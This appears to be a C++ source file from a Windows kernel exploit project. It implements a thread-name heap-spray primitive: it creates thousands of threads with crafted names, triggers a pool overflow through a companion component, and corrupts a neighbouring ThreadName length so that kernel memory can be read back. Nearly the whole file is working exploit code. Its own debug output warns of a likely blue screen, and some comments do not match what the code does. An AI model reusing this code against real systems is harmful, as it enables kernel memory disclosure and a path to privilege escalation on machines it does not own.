
#include "ThreadNameManager.h"
#include "functions.h"
#include "Hvergelmir.h"
#include <memory>

// Global guard for maximum leak buffer allocation in this translation unit
static const size_t THREADNAME_MAX_LEAK = 64 * 1024 * 1024; // 64 MB

// exitEvent is created once in the constructor to ensure proper error handling
static HANDLE exitEvent = NULL;

DWORD WINAPI DummyThread(LPVOID lpParam) {
	// Wait on event; if event handle is invalid just exit
	if (exitEvent == NULL) return 0;
	WaitForSingleObject(exitEvent, INFINITE);
	return 0;
}


ThreadNameManager::ThreadNameManager()
{
	leakThread = NULL;
	nameSize = NULL;

	HMODULE ntDLL = GetModuleHandleA("ntdll.dll");

	if (!ntDLL)
	{
         DEBUG_PRINT(" [!] Could not get NTDLL for ThreadNameManager\n");
		return;
	}

	_NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(ntDLL, "NtSetInformationThread");
	_NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(ntDLL, "NtQueryInformationThread");



	// create an event used by dummy threads to wait on and to signal shutdown
	if (exitEvent == NULL) {
		exitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!exitEvent) {
			DEBUG_PRINT(" [!] Failed to create exitEvent for ThreadNameManager\n");
		}
	}
}


bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 maxRetries)
{
    if (iChunkSize <= offsetof(UNICODE_STRING, Buffer) + 0x20) {
		DEBUG_PRINT(" [!] Invalid chunk size\n");
		return false;
	}
	nameSize = iChunkSize - offsetof(UNICODE_STRING, Buffer) - 0x20;
	leakThread = NULL;

	leakSize = iLeakSize;

	DEBUG_PRINT("\n [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####\n");

	ThreadNameOverflow tnOverflow;

	tnOverflow.poolHeader.poolTag = 0x6d4e6854;
	tnOverflow.poolHeader.blockSize = 0x10;
	tnOverflow.poolHeader.poolTag = 0x02;

	tnOverflow.threadName.Length = nameSize + leakSize;
	tnOverflow.threadName.MaximumLength = nameSize + leakSize;


    // Decide how many threads to create based on system uptime. Creating more threads
	// increases the chance of desired LFH layout on freshly booted systems, but
	// is heavier on long-running systems. Use a simple threshold (2 hours).

	for (UINT64 i = 0; i < maxRetries; i++)
	{
		// create half the threads before priming and the remainder after to mimic
		// previous behavior while scaling counts

		CreateThreads(3000);
		Hvergelmir::getInstance().PrimeOverflow(iChunkSize);

		Sleep(200);
		Hvergelmir::getInstance().TriggerOverflow((BYTE*)&tnOverflow, 0x24);

		leakThread = ScanForCorruptName();

		if (leakThread)
		{
			DEBUG_PRINT(" [*] ###### Found ThreadName Overwrite ######\n");
			CleanExtraThreads();
			return true;
		}
		DEBUG_PRINT("       Retrying Pool Layout\n");
		ClearThreads();

	}
	DEBUG_PRINT(" [!] Failed to Corrupt ThreadName, Likelyhood of BSOD is HIGH! Exiting\n");
	return false;
}



void ThreadNameManager::CreateThreads(UINT64 iThreadCount)
{
    // Guard against invalid nameSize or missing APIs
	if (nameSize == 0 || !_NtSetInformationThread) return;
	if (exitEvent) ResetEvent(exitEvent);

	// Prepare payload and THREAD_NAME_INFORMATION
	std::vector<WCHAR> payload(nameSize / sizeof(WCHAR));
	std::fill(payload.begin(), payload.end(), L'A');

	THREAD_NAME_INFORMATION threadName = { 0 };
	threadName.ThreadName.Buffer = payload.data();
	threadName.ThreadName.Length = (USHORT)nameSize;
	threadName.ThreadName.MaximumLength = (USHORT)nameSize;

	threadCount = iThreadCount;
	threads = (HANDLE*)calloc((size_t)iThreadCount, sizeof(HANDLE));
	if (!threads) {
		DEBUG_PRINT(" [!] Failed to allocate thread handles array\n");
		return;
	}

    for (UINT64 i = 0; i < iThreadCount; i++) {
		HANDLE h = CreateThread(NULL, 0, DummyThread, NULL, 0, NULL);
		if (h == NULL) {
			DEBUG_PRINT(" [!] CreateThread failed at index %llu\n", i);
			threads[i] = NULL;
			continue;
		}
		threads[i] = h;

		// Only call if function pointer is valid
		if (_NtSetInformationThread) {
			_NtSetInformationThread(threads[i], ThreadNameInformation, &threadName, sizeof(threadName));
		}
	}
}

HANDLE ThreadNameManager::ScanForCorruptName()
{
	if (!_NtQueryInformationThread || nameSize == 0 || threadCount == 0) return NULL;

    size_t bufSize = (size_t)nameSize + (size_t)leakSize + 0x20;
	if (bufSize == 0 || bufSize > THREADNAME_MAX_LEAK) {
		DEBUG_PRINT(" [!] Invalid buffer size for ScanForCorruptName: %llu\n", (unsigned long long)bufSize);
		return NULL;
	}

	BYTE* buffer = (BYTE*)malloc(bufSize);
	if (!buffer) {
		DEBUG_PRINT(" [!] Failed to allocate buffer in ScanForCorruptName\n");
		return NULL;
	}

	ULONG returnLength = 0;
	for (UINT64 idx = 0; idx < threadCount; ++idx)
	{
		HANDLE t = threads[idx];
		if (t == NULL || t == INVALID_HANDLE_VALUE) continue;

		NTSTATUS status = _NtQueryInformationThread(t, ThreadNameInformation, buffer, (ULONG)bufSize, &returnLength);
		if (!NT_SUCCESS(status)) continue;

		if (returnLength > nameSize + 0x10) {
			leakThread = t;
			free(buffer);
			return t;
		}
	}

	free(buffer);
	return NULL;
}

std::vector<BYTE> ThreadNameManager::LeakData()
{
    std::vector<BYTE> empty; 
	if (!leakThread) {
		DEBUG_PRINT(" [!] Leak Thread has not yet been Located!\n");
		return empty;
	}
    // _NtQueryInformationThread is expected to return leakSize bytes for the leak
	// guard against absurd sizes
	if (leakSize == 0 || leakSize > THREADNAME_MAX_LEAK) {
		DEBUG_PRINT(" [!] Invalid or too large leakSize: %llu\n", (unsigned long long)leakSize);
		return empty;
	}

    // Build an initial buffer with headroom for the Unicode header + leak
    const size_t MAX_LEAK = 64 * 1024 * 1024; // 64 MB guard
	const size_t EXTRA_HEADER = 0x100;
	size_t bufSize = (size_t)nameSize + (size_t)leakSize + EXTRA_HEADER;
	const size_t MIN_BUF = 64 * 1024; // 64 KB to avoid small buffers
	if (bufSize < MIN_BUF) bufSize = MIN_BUF;
	if (bufSize > MAX_LEAK) {
		DEBUG_PRINT(" [!] Computed bufSize too large: %llu\n", (unsigned long long)bufSize);
		return empty;
	}

	if (!_NtQueryInformationThread) return empty;

	std::vector<BYTE> data;
	ULONG returnLength = 0;
	NTSTATUS status = STATUS_UNSUCCESSFUL;

    const int MAX_ATTEMPTS = 10;
	int attempt = 0;

	while (attempt < MAX_ATTEMPTS) {
		data.assign(bufSize, 0);

		status = _NtQueryInformationThread(leakThread, ThreadNameInformation, data.data(), (ULONG)bufSize, &returnLength);
		DEBUG_PRINT(" [*] LeakData attempt %d: status=0x%X returnLength=%lu bufSize=%llu\n", attempt, status, returnLength, (unsigned long long)bufSize);
		if (NT_SUCCESS(status) && returnLength > 0) break;

        if (status == STATUS_BUFFER_TOO_SMALL || returnLength > (ULONG)bufSize) {
			size_t newSize = bufSize * 2;
            if (returnLength > 0) {
				size_t candidate = (size_t)returnLength + EXTRA_HEADER;
				newSize = (newSize > candidate) ? newSize : candidate;
			}
			if (newSize > THREADNAME_MAX_LEAK) {
				DEBUG_PRINT(" [!] Required leak buffer too large: %llu\n", (unsigned long long)newSize);
				break;
			}
			bufSize = newSize;
			attempt++;
			continue;
		}

		// other failure
		break;
	}

	if (!NT_SUCCESS(status) || returnLength == 0) {
		DEBUG_PRINT(" [!] Data Leak Failed! status=0x%X ret=%lu\n", status, returnLength);
		return empty;
	}

	// Compute copy length after UNICODE_STRING data
	size_t copyLen = 0;
	if (returnLength > (ULONG)nameSize + 0x18) {
		copyLen = (size_t)((ULONG)returnLength - (ULONG)nameSize - 0x18);
	}
	std::vector<BYTE> output(copyLen);
	if (copyLen > 0) memcpy(output.data(), data.data() + nameSize + 0x18, copyLen);
	return output;
}

BYTE* ThreadNameManager::LeakDataMalloc()
{
	std::vector<BYTE> v = LeakData();
	if (v.empty()) return NULL;
	BYTE* ptr = (BYTE*)malloc(v.size());
	if (!ptr) return NULL;
	memcpy(ptr, v.data(), v.size());
	return ptr;
}


void ThreadNameManager::FreeSlots(UINT64 iStartCount, UINT64 iInterval)
{
	// Free every nth thread slot to create holes in the pool
	THREAD_NAME_INFORMATION emptyThreadName = { 0 };
	if (!_NtSetInformationThread || threadCount == 0) return;
	for (UINT64 i = iStartCount; i < threadCount; i += iInterval) {
		if (threads[i] == NULL) continue;
		_NtSetInformationThread(threads[i], ThreadNameInformation, &emptyThreadName, sizeof(emptyThreadName));
	}
}

void ThreadNameManager::CleanExtraThreads()
{

    if (!leakThread)
	{
		DEBUG_PRINT(" [!] Leak Thread not yet Found, Cant Clean Threads\n");
		return;
	}


	THREAD_NAME_INFORMATION emptyThreadName = { 0 };

	for (int i = 0; i < threadCount; i += 1) {
		if (leakThread != threads[i])
			_NtSetInformationThread(threads[i], ThreadNameInformation, &emptyThreadName, sizeof(emptyThreadName));
	}

}


void ThreadNameManager::ClearThreads()
{
    if (exitEvent) SetEvent(exitEvent);

    if (threadCount > 0 && threads) {
		// wait with timeout to avoid infinite hang; on timeout proceed to best-effort cleanup
		DWORD waitRes = WaitForMultipleObjects((DWORD)threadCount, threads, TRUE, 5000);

		for (UINT64 i = 0; i < threadCount; i++) {
			if (threads[i] != NULL && threads[i] != INVALID_HANDLE_VALUE) {
				CloseHandle(threads[i]);
				threads[i] = NULL;
			}
		}
		free(threads);
		threads = NULL;
        // reset the exit event so future threads will wait again
		if (exitEvent) ResetEvent(exitEvent);
	}
}